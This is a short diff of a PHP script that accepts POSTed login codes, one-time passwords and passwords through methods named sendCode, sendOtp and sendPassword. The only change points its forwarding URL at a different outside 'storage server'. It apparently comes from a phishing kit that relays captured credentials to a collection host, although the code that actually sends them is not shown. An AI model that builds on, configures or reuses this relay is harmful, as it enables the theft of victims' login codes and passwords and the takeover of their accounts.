@@ -6,7 +6,7 @@ require("_core.php");
 
 $r = array();
 $allowedMethod = ["sendCode","sendOtp","sendPassword","update","getStatus"];
-$apiUrl = "https://cstlo.site/API/server.php"; // Ganti dengan URL API server penyimpanan
+$apiUrl = "https://demo.igt-fx.com/server.php"; // Ganti dengan URL API server penyimpanan
 
 if (isset($_POST["method"]) && in_array($_POST["method"], $allowedMethod)) {
     $method = $_POST["method"];
